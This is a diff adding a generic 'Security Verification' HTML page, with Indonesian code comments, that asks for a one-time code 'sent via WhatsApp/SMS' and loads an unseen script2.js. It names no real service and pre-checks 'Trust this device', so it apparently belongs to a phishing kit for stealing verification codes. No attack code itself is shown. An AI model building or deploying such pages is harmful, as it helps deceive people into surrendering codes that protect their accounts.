@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        /* --- CSS STYLE --- */
+        body {
+            background-color: #0d1117; /* Warna gelap ala GitHub/Discord */
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Ikon Gembok Custom CSS */
+        .icon-wrapper {
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .circle {
+            width: 90px;
+            height: 90px;
+            border: 2px solid #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 10px rgba(26, 115, 232, 0.3);
+        }
+
+        .lock-body {
+            width: 28px;
+            height: 22px;
+            border: 2px solid #1a73e8;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .lock-body::before {
+            content: '';
+            width: 14px;
+            height: 14px;
+            border: 2px solid #1a73e8;
+            border-bottom: none;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            position: absolute;
+            top: -16px;
+            left: 5px;
+        }
+
+        /* Teks & Form */
+        .instruction {
+            font-size: 1.1rem;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            color: #f0f6fc;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 1rem;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #58a6ff;
+        }
+
+        .confirm-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #4f46e5; /* Warna indigo */
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .confirm-btn:hover {
+            background-color: #4338ca;
+        }
+
+        /* Checkbox */
+        .trust-section {
+            display: flex;
+            align-items: flex-start;
+            text-align: left;
+            margin: 20px 0 35px 0;
+            gap: 10px;
+        }
+
+        .trust-section input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 3px;
+            accent-color: #4f46e5;
+        }
+
+        .trust-text b {
+            display: block;
+            font-size: 0.95rem;
+        }
+
+        .trust-text span {
+            color: #8b949e;
+            font-size: 0.85rem;
+        }
+
+        /* Footer Links */
+        .footer-info {
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .link {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .backup-prompt {
+            margin-top: 25px;
+            color: #f0f6fc;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="icon-wrapper">
+            <div class="circle">
+                <div class="lock-body"></div>
+            </div>
+        </div>
+
+        <p class="instruction">
+            Enter the code we sent via WhatsApp/SMS to your mobile number:
+        </p>
+
+        <form id="Formulir">
+            <input type="OTP" class="input-field" id="OTP" placeholder="Security Code" required>
+            
+            <button class="confirm-btn" type="submit">Confirm</button>
+</form>
+            <div class="trust-section">
+                <input type="checkbox" id="trust" checked>
+                <div class="trust-text">
+                    <b>Trust this device</b>
+                    <span>We won't ask for a code next time you log in</span>
+                </div>
+            </div>
+        
+
+        <div class="footer-info">
+            <p>Didn't get a security code?</p>
+            <a href="OTP.hmtl" class="link">Send code via SMS instead</a>
+            
+            <p class="backup-prompt">
+                If you're unable to receive a security code, use one of your <a href="#" class="link">backup codes</a>.
+            </p>
+        </div>
+    </div>
+
+    <script src="script2.js"></script>
+
+</body>
+</html>
